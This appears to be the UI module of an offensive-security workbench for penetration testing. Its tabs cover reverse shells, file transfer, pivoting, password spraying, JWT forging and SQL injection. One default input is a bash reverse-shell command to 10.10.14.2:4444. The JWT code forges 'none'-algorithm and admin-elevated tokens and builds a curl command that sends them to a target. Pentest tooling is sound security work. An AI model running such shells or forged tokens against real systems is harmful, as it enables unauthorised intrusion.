                  + '<span class="wb-tc-body"><span class="wb-tc-title">' + esc(t.label) + '</span><span class="wb-tc-sub">' + esc(t.sub) + '</span></span>'
                  + '</a>';
              }).join('')
            + '</div></div>';
        }).join('')
      + '</nav>';

    var body = panelForTab(active);
    return '<section class="wb" data-wb-active="' + esc(active) + '">' + heroHtml + deckHtml + '<div id="wb-active-host">' + body + '</div></section>';
  }

  function repaintActivePanel(mount) {
    var sec = mount.classList && mount.classList.contains('wb') ? mount : mount.querySelector('.wb');
    var active = sec ? sec.getAttribute('data-wb-active') : 'revshell';
    var host = mount.querySelector('#wb-active-host');
    if (!host) return;
    if (active === 'revshell') refreshRevshellInPlace(mount);
    else if (active === 'transfer') { var tf = mount.querySelector('#wb-tf-out'); if (tf) tf.innerHTML = renderTransferOut(); }
    else if (active === 'pivot') { var pv = mount.querySelector('#wb-piv-out'); if (pv) pv.innerHTML = renderPivotOut(); }
    else if (active === 'spray') { var sp = mount.querySelector('#wb-sp-out'); if (sp) sp.innerHTML = renderSprayOut(); }
    else if (active === 'codec') { paintCodecOutputs(mount, state.codecInput); }
    else if (active === 'wordlists') { var wl = mount.querySelector('#wb-wl-out'); if (wl) wl.innerHTML = renderWordlistItems(); }
    else if (active === 'gtfobins') { var gt = mount.querySelector('#wb-gtfo-out'); if (gt) gt.innerHTML = renderGtfoResults(state.gtfoQuery); }
    else if (active === 'jwt') { var jw = mount.querySelector('#wb-jwt-out'); if (jw) jw.innerHTML = renderJwtStudio(); }
    else if (active === 'explain') { var ex = mount.querySelector('#wb-ex-out'); if (ex) ex.innerHTML = renderExplainResults(state.explainInput); }
  }

  function initActivePanelEffects(mount) {
    if (mount.querySelector('#wb-enc-in')) {
      paintCodecOutputs(mount, state.codecInput);
    }
    if (mount.querySelector('#wb-ex-out') && !OBOL.parsers && OBOL.lazy && OBOL.lazy.loadGroup) {
      OBOL.lazy.loadGroup('parsers').then(function () {
        var out = mount.querySelector('#wb-ex-out');
        if (out) out.innerHTML = renderExplainResults(state.explainInput);
      });
    }
  }

  function mounted(ctx) {
    var mount = ctx.mount.querySelector('.wb') || ctx.mount;

    initActivePanelEffects(mount);

    // Direct tool-card selection (switches in-place immediately and syncs URL hash)
    U.on(mount, 'click', '[data-wb-tab]', function (e, t) {
      e.preventDefault();
      var nextTab = resolveTabId(t.getAttribute('data-wb-tab'));
      var sec = mount.classList && mount.classList.contains('wb') ? mount : mount.querySelector('.wb');
      if (sec) sec.setAttribute('data-wb-active', nextTab);
      Array.prototype.forEach.call(mount.querySelectorAll('[data-wb-tab]'), function (el) {
        var on = el.getAttribute('data-wb-tab') === nextTab;
        el.classList.toggle('active', on);
        el.setAttribute('aria-selected', on ? 'true' : 'false');
      });
      var host = mount.querySelector('#wb-active-host');
      if (host) {
        host.innerHTML = panelForTab(nextTab);
        initActivePanelEffects(mount);
      }
      try {
        if (window.history && window.history.replaceState) {
          window.history.replaceState(null, '', '#/workbench/' + nextTab);
        }
      } catch (err) {}
    });

    // Global Workbench Context Bar edits
    U.on(mount, 'input', '[data-wb-ctx]', function (e, t) {
      var k = t.getAttribute('data-wb-ctx');
      syncParamToStore(k, t.value.trim());
      if (k === 'lhost') { var lh = mount.querySelector('#wb-lhost'); if (lh && lh !== t) lh.value = state.lhost; }
      if (k === 'lport') { var lp = mount.querySelector('#wb-lport'); if (lp && lp !== t) lp.value = t.value.trim(); }
      repaintActivePanel(mount);
    });
    U.on(mount, 'change', '[data-wb-ctx]', function (e, t) {
      var k = t.getAttribute('data-wb-ctx');
      var clean = sanitizeWbParam(k, t.value);
      if (clean !== t.value) t.value = clean;
      syncParamToStore(k, clean);
      if (OBOL.app && OBOL.app.renderSidebar) OBOL.app.renderSidebar();
      if (OBOL.ctxbar && OBOL.ctxbar.render) OBOL.ctxbar.render();
      repaintActivePanel(mount);
    });

    // Reverse Shell sub-tabs & controls
    U.on(mount, 'click', '[data-wb-rssub]', function (e, t) {
      state.rsSubmode = t.getAttribute('data-wb-rssub');
      Array.prototype.forEach.call(mount.querySelectorAll('[data-wb-rssub]'), function (b) { b.classList.toggle('on', b === t); });
      refreshRevshellInPlace(mount);
    });
    U.on(mount, 'input', '#wb-lhost', function (e, t) {
      syncParamToStore('lhost', t.value.trim());
      var topLh = mount.querySelector('[data-wb-ctx="lhost"]'); if (topLh) topLh.value = state.lhost;
      refreshRevshellInPlace(mount);
    });
    U.on(mount, 'change', '#wb-lhost', function (e, t) {
      var clean = sanitizeWbParam('lhost', t.value);
      if (clean !== t.value) t.value = clean;
      syncParamToStore('lhost', clean);
      var topLh = mount.querySelector('[data-wb-ctx="lhost"]'); if (topLh) topLh.value = clean;
      if (OBOL.app && OBOL.app.renderSidebar) OBOL.app.renderSidebar();
      if (OBOL.ctxbar && OBOL.ctxbar.render) OBOL.ctxbar.render();
      refreshRevshellInPlace(mount);
    });
    U.on(mount, 'input', '#wb-lport', function (e, t) {
      syncParamToStore('lport', t.value.trim());
      var topLp = mount.querySelector('[data-wb-ctx="lport"]'); if (topLp) topLp.value = t.value.trim();
      refreshRevshellInPlace(mount);
    });
    U.on(mount, 'click', '[data-wb-shell]', function (e, t) {
      state.shellId = t.getAttribute('data-wb-shell');
      refreshRevshellInPlace(mount);
    });
    U.on(mount, 'click', '[data-wb-enc]', function (e, t) {
      state.enc = t.getAttribute('data-wb-enc');
      refreshRevshellInPlace(mount);
    });
    U.on(mount, 'click', '[data-wb-msf]', function (e, t) {
      state.msfId = t.getAttribute('data-wb-msf');
      refreshRevshellInPlace(mount);
    });
    U.on(mount, 'click', '[data-wb-ws]', function (e, t) {
      state.wsId = t.getAttribute('data-wb-ws');
      refreshRevshellInPlace(mount);
    });

    // File Transfer controls
    U.on(mount, 'click', '[data-wb-tfdir]', function (e, t) {
      state.tfDir = t.getAttribute('data-wb-tfdir');
      var presets = (W.FILE_TRANSFER_PRESETS && W.FILE_TRANSFER_PRESETS[state.tfDir]) || [];
      if (presets[0]) state.tfFile = presets[0].file;
      var host = mount.querySelector('#wb-active-host');
      if (host) host.innerHTML = transferPanel();
    });
    U.on(mount, 'click', '[data-wb-tffile]', function (e, t) {
      state.tfFile = t.getAttribute('data-wb-tffile');
      var inp = mount.querySelector('#wb-tf-input'); if (inp) inp.value = state.tfFile;
      Array.prototype.forEach.call(mount.querySelectorAll('[data-wb-tffile]'), function (b) { b.classList.toggle('on', b === t); });
      var out = mount.querySelector('#wb-tf-out'); if (out) out.innerHTML = renderTransferOut();
    });
    U.on(mount, 'input', '#wb-tf-input', function (e, t) {
      state.tfFile = t.value;
      var out = mount.querySelector('#wb-tf-out'); if (out) out.innerHTML = renderTransferOut();
    });
    U.on(mount, 'input', '#wb-tf-port', function (e, t) {
      state.tfPort = t.value.trim() || '8000';
      var out = mount.querySelector('#wb-tf-out'); if (out) out.innerHTML = renderTransferOut();
    });

    // Pivot & Tunnels controls
    U.on(mount, 'click', '[data-wb-pivscen]', function (e, t) {
      state.pivScenario = t.getAttribute('data-wb-pivscen');
      var scen = (W.PIVOT_SCENARIOS || []).filter(function (s) { return s.id === state.pivScenario; })[0];
      if (scen) state.pivValue = scen.defaultInput;
      if (state.pivScenario === 'subnet-route' || state.pivScenario === 'subnet') state.pivTool = 'ligolo';
      else if (state.pivScenario === 'reverse-relay') state.pivTool = 'native';
      else state.pivTool = 'chisel';
      var host = mount.querySelector('#wb-active-host');
      if (host) host.innerHTML = pivotPanel();
    });
    U.on(mount, 'click', '[data-wb-pivpreset]', function (e, t) {
      state.pivValue = t.getAttribute('data-wb-pivpreset');
      var inp = mount.querySelector('#wb-piv-val'); if (inp) inp.value = state.pivValue;
      Array.prototype.forEach.call(mount.querySelectorAll('[data-wb-pivpreset]'), function (b) { b.classList.toggle('on', b === t); });
      var out = mount.querySelector('#wb-piv-out'); if (out) out.innerHTML = renderPivotOut();
    });
    U.on(mount, 'input', '#wb-piv-val', function (e, t) {
      state.pivValue = t.value;
      var out = mount.querySelector('#wb-piv-out'); if (out) out.innerHTML = renderPivotOut();
    });
    U.on(mount, 'click', '[data-wb-pivtool]', function (e, t) {
      state.pivTool = t.getAttribute('data-wb-pivtool');
      Array.prototype.forEach.call(mount.querySelectorAll('[data-wb-pivtool]'), function (b) { b.classList.toggle('on', b === t); });
      var out = mount.querySelector('#wb-piv-out'); if (out) out.innerHTML = renderPivotOut();
    });

    // Hash ID controls
    U.on(mount, 'input', '#wb-hash-in', function (e, t) {
      state.hashInput = t.value;
      var out = mount.querySelector('#wb-hash-results');
      if (out) out.innerHTML = renderHashResults(state.hashInput);
    });
    U.on(mount, 'click', '[data-wb-sample]', function (e, t) {
      state.hashInput = t.getAttribute('data-wb-sample');
      var inp = mount.querySelector('#wb-hash-in'); if (inp) inp.value = state.hashInput;
      var out = mount.querySelector('#wb-hash-results'); if (out) out.innerHTML = renderHashResults(state.hashInput);
    });

    // Encode & Decode controls + Layer Stacker + Scenario Bypasses
    U.on(mount, 'input', '#wb-enc-in', function (e, t) {
      state.codecInput = t.value;
      state.codecStack = [];
      paintCodecOutputs(mount, state.codecInput);
    });
    U.on(mount, 'click', '[data-wb-encsample]', function (e, t) {
      state.codecInput = t.getAttribute('data-wb-encsample');
      state.codecStack = [];
      var inp = mount.querySelector('#wb-enc-in'); if (inp) inp.value = state.codecInput;
      paintCodecOutputs(mount, state.codecInput);
    });
    U.on(mount, 'click', '[data-wb-codecmode]', function (e, t) {
      var nextMode = t.getAttribute('data-wb-codecmode');
      var defaultPlain = 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1';
      var defaultEncoded = W.b64(W.hexEnc('flag{layered_secret_decoded}'));
      if (nextMode === 'decode' && state.codecInput === defaultPlain && !state.codecStack.length) {
        state.codecInput = defaultEncoded;
      } else if ((nextMode === 'encode' || nextMode === 'scenarios') && state.codecInput === defaultEncoded && !state.codecStack.length) {
        state.codecInput = defaultPlain;
      }
      state.codecMode = nextMode;
      var host = mount.querySelector('#wb-active-host');
      if (host) {
        host.innerHTML = codecPanel();
        paintCodecOutputs(mount, state.codecInput);
      }
    });
    U.on(mount, 'click', '[data-wb-codecscen]', function (e, t) {
      state.codecScenario = t.getAttribute('data-wb-codecscen');
      paintCodecOutputs(mount, state.codecInput);
    });
    U.on(mount, 'click', '[data-wb-stack-add]', function (e, t) {
      var after = t.getAttribute('data-wb-stack-add') || '';
      var label = t.getAttribute('data-wb-stack-label') || 'Encoded';
      state.codecStack.push({ label: label, before: state.codecInput, after: after });
      state.codecInput = after;
      var inp = mount.querySelector('#wb-enc-in'); if (inp) inp.value = after;
      paintCodecOutputs(mount, after);
    });
    U.on(mount, 'click', '[data-wb-stack]', function (e, t) {
      var act = t.getAttribute('data-wb-stack');
      if (act === 'undo' && state.codecStack.length) {
        var last = state.codecStack.pop();
        state.codecInput = last.before;
      } else if (act === 'reset' && state.codecStack.length) {
        state.codecInput = state.codecStack[0].before;
        state.codecStack = [];
      } else if (act === 'verify') {
        state.codecMode = 'decode';
        var host = mount.querySelector('#wb-active-host');
        if (host) {
          host.innerHTML = codecPanel();
          paintCodecOutputs(mount, state.codecInput);
        }
        return;
      }
      var inp = mount.querySelector('#wb-enc-in'); if (inp) inp.value = state.codecInput;
      paintCodecOutputs(mount, state.codecInput);
    });
    U.on(mount, 'click', '[data-wb-chain]', function (e, t) {
      var val = t.getAttribute('data-wb-chain') || '';
      state.codecInput = val;
      state.codecStack = [];
      var inp = mount.querySelector('#wb-enc-in');
      if (inp) {
        inp.value = val;
        paintCodecOutputs(mount, val);
      } else {
        state.codecMode = 'encode';
        window.location.hash = '#/workbench/codec';
      }
    });

    // JWT Studio controls
    U.on(mount, 'input', '#wb-jwt-in', function (e, t) {
      state.jwtInput = t.value;
      syncJwtEditorFromToken(state.jwtInput);
      var out = mount.querySelector('#wb-jwt-out');
      if (out) out.innerHTML = renderJwtStudio();
    });
    U.on(mount, 'click', '[data-wb-jwtsample]', function (e, t) {
      state.jwtInput = t.getAttribute('data-wb-jwtsample');
      syncJwtEditorFromToken(state.jwtInput);
      var inp = mount.querySelector('#wb-jwt-in'); if (inp) inp.value = state.jwtInput;
      var out = mount.querySelector('#wb-jwt-out'); if (out) out.innerHTML = renderJwtStudio();
    });
    U.on(mount, 'input', '#wb-jwt-hdr, #wb-jwt-pay, #wb-jwt-sec', function () {
      var hEl = mount.querySelector('#wb-jwt-hdr');
      var pEl = mount.querySelector('#wb-jwt-pay');
      var sEl = mount.querySelector('#wb-jwt-sec');
      if (hEl) state.jwtHeaderText = hEl.value;
      if (pEl) state.jwtPayloadText = pEl.value;
      if (sEl) state.jwtSecret = sEl.value;
      recomputeForgedJwt();
      var box = mount.querySelector('#wb-jwt-forged-box');
      var p = engParams();
      if (box) {
        box.innerHTML = state.jwtForged
          ? cmdRow(state.jwtForged, 'wb-jwt-forged', '', { locus: 'jwt' })
            + '<div class="wb-field-l">Send Forged Token with curl</div>'
            + cmdRow('curl -i -H "Authorization: Bearer ' + state.jwtForged + '" http://' + p.target + '/', 'wb-jwt-curl', '', { locus: 'kali$' })
          : '<p class="wb-note">Fix JSON syntax in Header or Payload to generate token.</p>';
      }
    });
    U.on(mount, 'click', '[data-wb-jwtact]', function (e, t) {
      var act = t.getAttribute('data-wb-jwtact');
      try {
        var h = JSON.parse(state.jwtHeaderText || '{"alg":"HS256","typ":"JWT"}');
        var p = JSON.parse(state.jwtPayloadText || '{}');
        if (act === 'elevate') {
          p.role = 'admin';
          p.sub = 'admin';
          p.is_admin = true;
          state.jwtPayloadText = JSON.stringify(p, null, 2);
        } else if (act === 'none') {
          h.alg = 'none';
          state.jwtForgeMode = 'none';
          state.jwtHeaderText = JSON.stringify(h, null, 2);
        } else if (act === 'hs256') {
          h.alg = 'HS256';
          state.jwtForgeMode = 'hs256';
          state.jwtHeaderText = JSON.stringify(h, null, 2);
        }
        recomputeForgedJwt();
        var out = mount.querySelector('#wb-jwt-out');
        if (out) out.innerHTML = renderJwtStudio();
      } catch (err) {}
    });

    // GTFOBins & LOLBAS controls
    U.on(mount, 'input', '#wb-gtfo-in', function (e, t) {
      state.gtfoQuery = t.value;
      var out = mount.querySelector('#wb-gtfo-out'); if (out) out.innerHTML = renderGtfoResults(state.gtfoQuery);
    });
    U.on(mount, 'click', '[data-wb-gtfo]', function (e, t) {
      state.gtfoQuery = t.getAttribute('data-wb-gtfo');
      var inp = mount.querySelector('#wb-gtfo-in'); if (inp) inp.value = state.gtfoQuery;
      var out = mount.querySelector('#wb-gtfo-out'); if (out) out.innerHTML = renderGtfoResults(state.gtfoQuery);
    });
    U.on(mount, 'click', '[data-wb-gtfoplat]', function (e, t) {
      state.gtfoPlatform = t.getAttribute('data-wb-gtfoplat');
      state.gtfoQuery = '';
      var host = mount.querySelector('#wb-active-host'); if (host) host.innerHTML = gtfoPanel();
    });
    U.on(mount, 'click', '[data-wb-gtfocap]', function (e, t) {
      state.gtfoCap = t.getAttribute('data-wb-gtfocap');
      var host = mount.querySelector('#wb-active-host'); if (host) host.innerHTML = gtfoPanel();
    });

    // Wordlists controls
    U.on(mount, 'click', '[data-wb-wltask]', function (e, t) {
      state.wlTask = t.getAttribute('data-wb-wltask');
      var host = mount.querySelector('#wb-active-host');
      if (host) host.innerHTML = wordlistsPanel();
    });
    U.on(mount, 'click', '[data-wb-wltool]', function (e, t) {
      state.wlTool = t.getAttribute('data-wb-wltool');
      Array.prototype.forEach.call(mount.querySelectorAll('[data-wb-wltool]'), function (b) { b.classList.toggle('on', b === t); });
      var out = mount.querySelector('#wb-wl-out'); if (out) out.innerHTML = renderWordlistItems();
    });
    U.on(mount, 'click', '[data-wb-wlext]', function (e, t) {
      state.wlExt = t.getAttribute('data-wb-wlext');
      Array.prototype.forEach.call(mount.querySelectorAll('[data-wb-wlext]'), function (b) { b.classList.toggle('on', b === t); });
      var out = mount.querySelector('#wb-wl-out'); if (out) out.innerHTML = renderWordlistItems();
    });

    // Manual SQLi controls
    U.on(mount, 'click', '[data-wb-dbms]', function (e, t) {
      state.sqliDbms = t.getAttribute('data-wb-dbms');
      Array.prototype.forEach.call(mount.querySelectorAll('[data-wb-dbms]'), function (b) { b.classList.toggle('on', b === t); });
      var out = mount.querySelector('#wb-sqli-out'); if (out) out.innerHTML = renderSqliOut();
    });
    U.on(mount, 'click', '[data-wb-sqlimode]', function (e, t) {
      state.sqliMode = t.getAttribute('data-wb-sqlimode');
      var host = mount.querySelector('#wb-active-host'); if (host) host.innerHTML = sqliPanel();
    });
    U.on(mount, 'click', '[data-wb-sqlictx]', function (e, t) {
      state.sqliCtx = t.getAttribute('data-wb-sqlictx');
      Array.prototype.forEach.call(mount.querySelectorAll('[data-wb-sqlictx]'), function (b) { b.classList.toggle('on', b === t); });
      var out = mount.querySelector('#wb-sqli-out'); if (out) out.innerHTML = renderSqliOut();
    });
    U.on(mount, 'input', '#wb-sqli-cols', function (e, t) {
      state.sqliCols = Math.max(0, Math.min(20, parseInt(t.value, 10) || 0));
      if (state.sqliCols > 0 && state.sqliVis > state.sqliCols) {
        state.sqliVis = state.sqliCols;
        var visInp = mount.querySelector('#wb-sqli-vis');
        if (visInp) visInp.value = String(state.sqliVis);
      }
      var out = mount.querySelector('#wb-sqli-out'); if (out) out.innerHTML = renderSqliOut();
    });
    U.on(mount, 'input', '#wb-sqli-vis', function (e, t) {
      state.sqliVis = Math.max(0, Math.min(20, parseInt(t.value, 10) || 0));
      var out = mount.querySelector('#wb-sqli-out'); if (out) out.innerHTML = renderSqliOut();
    });
    U.on(mount, 'input', '#wb-sqli-tbl', function (e, t) {
      state.sqliTable = t.value.trim();
      var out = mount.querySelector('#wb-sqli-out'); if (out) out.innerHTML = renderSqliOut();
    });

    // Output & Error Doctor controls
    U.on(mount, 'click', '#wb-ex-go', function () {
      var inp = mount.querySelector('#wb-ex-in');
      if (inp) state.explainInput = inp.value;
      var out = mount.querySelector('#wb-ex-out');
      if (out) out.innerHTML = renderExplainResults(state.explainInput);
    });
    U.on(mount, 'click', '[data-wb-exsample]', function (e, t) {
      state.explainInput = t.getAttribute('data-wb-exsample');
      var inp = mount.querySelector('#wb-ex-in'); if (inp) inp.value = state.explainInput;
      var out = mount.querySelector('#wb-ex-out'); if (out) out.innerHTML = renderExplainResults(state.explainInput);
    });
    U.on(mount, 'click', '#wb-explain-commit', function () {
      if (!state.explainInput || !OBOL.ingest || !OBOL.ingest.run) return;
      var p = engParams();
      Promise.resolve(OBOL.ingest.ensureParsers ? OBOL.ingest.ensureParsers() : true).then(function () {
        var res = OBOL.ingest.run({ text: state.explainInput, scope: 'host:' + p.target, source: 'workbench' });
        var msgEl = mount.querySelector('#wb-explain-saved');
        if (msgEl) {
          var nAdded = (res && typeof res.added === 'number') ? res.added : ((res && res.added && res.added.length) || 0);
          msgEl.textContent = res && res.ok ? ('Saved to ' + p.target + ' (' + nAdded + ' new fact' + (nAdded === 1 ? '' : 's') + ' minted).') : 'Saved to engagement log.';
        }
      });
    });

    // Spray Planner controls
    U.on(mount, 'input', '#wb-sp-thresh, #wb-sp-win, #wb-sp-margin, #wb-sp-pass, #wb-sp-users', function () {
      var th = mount.querySelector('#wb-sp-thresh');
      var wn = mount.querySelector('#wb-sp-win');
      var mg = mount.querySelector('#wb-sp-margin');
      var ps = mount.querySelector('#wb-sp-pass');
      var us = mount.querySelector('#wb-sp-users');
      if (th) state.sprayThreshold = th.value;
      if (wn) state.sprayWindow = wn.value;
      if (mg) state.sprayMargin = mg.value;
      if (ps) state.sprayCandidate = ps.value;
      if (us) state.sprayUserFile = us.value;
      var out = mount.querySelector('#wb-sp-out');
      if (out) out.innerHTML = renderSprayOut();
    });

    // Copy buttons (also register in OBOL.ingest.setLastCopied for the Operator Attention Frame)
    U.on(mount, 'click', '.btn-copy', function (e, t) {
      var copiedCmd = t.getAttribute('data-copy') || '';
      if (copiedCmd && OBOL.ingest && typeof OBOL.ingest.setLastCopied === 'function') {
        var sec = mount.classList && mount.classList.contains('wb') ? mount : mount.querySelector('.wb');
        var activeTab = (sec && sec.getAttribute('data-wb-active')) || 'revshell';
        var p = engParams();
        OBOL.ingest.setLastCopied({
          command: copiedCmd,
          actionId: t.getAttribute('data-action') || ('wb-' + activeTab),
          target: p.target || '',
          source: 'workbench:' + activeTab
        });
      }
      U.copy(copiedCmd, t);
    });
  }

  OBOL.routes.workbench = { render: render, mounted: mounted, TABS: TABS, CATEGORIES: CATEGORIES };
})(typeof globalThis !== 'undefined' ? globalThis : this);
